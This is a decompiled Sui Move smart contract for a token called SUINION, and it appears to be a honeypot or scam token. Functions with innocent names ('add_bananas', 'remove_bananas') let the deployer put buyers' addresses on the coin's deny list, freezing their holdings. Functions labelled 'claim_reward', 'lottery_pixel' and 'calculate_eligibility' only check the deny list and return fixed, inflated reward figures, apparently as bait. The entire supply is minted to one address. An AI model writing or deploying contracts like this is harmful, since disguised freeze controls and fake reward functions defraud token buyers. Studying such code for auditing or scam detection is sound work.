module 0x47909aab3f980e558437d686d8d121822833687e01f540351e61673be544b7b2::suinion {
    struct SUINION has drop {
        dummy_field: bool,
    }

    public fun add_bananas(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUINION>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_add<SUINION>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    public fun calculate_eligibility<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64, u8) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 1000000000000000000, 9)
    }

    public fun check_eligibility<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : bool {
        0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1)
    }

    public fun claim_reward<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 999000000000)
    }

    fun init(arg0: SUINION, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SUINION>(arg0, 9, b"SUINION", b"Suinion", b"Suinionnnnnnnn", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://orange-upper-booby-780.mypinata.cloud/ipfs/QmXFjH2YnwZLcmDjHq5sGgTXejWvCQ4shocK7aaKfYYtCo"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SUINION>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SUINION>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<SUINION>(&mut v3, 1000000000000000000, @0xaef784a15aadae8a47da6f9e4ed5e13928a51c36af5bb0c231054e95bdc5518a, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SUINION>>(v3);
    }

    public fun lottery_pixel<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 999000000000)
    }

    public fun remove_bananas(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUINION>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_remove<SUINION>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    // decompiled from Move bytecode v6
}

